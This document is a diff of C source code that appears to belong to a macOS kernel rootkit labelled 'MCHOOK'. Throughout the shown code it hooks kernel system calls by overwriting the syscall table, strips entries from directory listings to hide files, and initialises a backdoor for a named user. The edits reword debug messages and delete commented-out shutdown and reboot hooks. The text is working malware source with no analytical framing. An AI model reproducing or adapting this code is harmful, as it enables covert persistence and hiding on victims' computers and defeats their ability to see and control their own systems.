@@ -131,7 +131,7 @@ static int cdev_ioctl(dev_t dev,
         //pid_t pid = p->p_pid;
         strncpy(username, (char *)data, MAX_USER_SIZE);
 #ifdef DEBUG
-        printf("[MCHOOK] INIT FOR USER %s with pid %d\n", username, pid);
+        printf("[MCHOOK] INIT FOR USER %s with pid %d\n", username, p->p_pid);
 #endif
         
         backdoor_init(username, p);
@@ -703,7 +703,7 @@ int hook_getdirentriesattr(struct proc *p,
                 }
               }
 #ifdef DEBUG
-              printf("KEXT matched %s for %s\n", curr_entry, procName);
+              printf("%s REQUESTED %s\n", procName, curr_entry);
 #endif
               
               // Remove the entry from buf
@@ -734,6 +734,11 @@ int hook_getdirentriesattr(struct proc *p,
     copyout(&count, uap->count, sizeof(count));
     
     FREE(buf, MK_MBUF);
+  }
+  else {
+#ifdef DEBUG
+    printf("Process excluded from hiding: %s\n", procName);
+#endif
   }
   
   return success;
@@ -776,33 +781,7 @@ int hook_read(struct proc *p,
   return (error);
 }
 #endif
-/*
-int hook_shutdown(struct proc *p,
-                  struct mk_shutdown_args *uap,
-                  int *retval)
-{
-#ifdef DEBUG
-  printf("[MCHOOK] Shutdown called! MARK\n");
-#endif
-  
-  unhide_all_procs();
-  
-  return -1;//real_shutdown(p, uap, retval);
-}
 
-int hook_reboot(struct proc *p,
-                struct mk_reboot_args *uap,
-                int *retval)
-{
-#ifdef DEBUG
-  printf("[MCHOOK] Reboot called! MARK\n");
-#endif
-  
-  unhide_all_procs();
-  
-  return -1;//real_reboot(p, uap, retval);
-}
-*/
 #pragma mark -
 #pragma mark General purpose functions
 #pragma mark -
@@ -968,22 +947,7 @@ void place_hooks()
     _sysent[SYS_kill].sy_call = (sy_call_t *)hook_kill;
     fl_kill = 1;
   }
-  /*
-  if (fl_shutdown == 0) {
-    real_shutdown = (shutdown_func_t *)_sysent[SYS_shutdown].sy_call;
-    _sysent[SYS_shutdown].sy_call = (sy_call_t *)hook_shutdown;
-    fl_shutdown = 1;
-  }
   
-  if (fl_reboot == 0) {
-    real_reboot = (reboot_func_t *)_sysent[SYS_reboot].sy_call;
-    _sysent[SYS_reboot].sy_call = (sy_call_t *)hook_reboot;
-    fl_reboot = 1;
-#ifdef DEBUG
-    printf("[MCHOOK] Hooked reboot\n");
-#endif
-  }
-  */
 #ifdef DEBUG
   printf("[MCHOOK] Hooks in place\n");
 #endif
@@ -1010,16 +974,6 @@ void remove_hooks()
     _sysent[SYS_kill].sy_call = (sy_call_t *)real_kill;
     fl_kill = 0;
   }
-  /*
-  if (fl_shutdown) {
-    _sysent[SYS_shutdown].sy_call = (sy_call_t *)real_shutdown;
-    fl_shutdown = 0;
-  }
-  
-  if (fl_reboot) {
-    _sysent[SYS_reboot].sy_call = (sy_call_t *)real_reboot;
-    fl_shutdown = 0;
-  }*/
 }
 
 void add_dir_to_hide(char *dirName, pid_t pid)
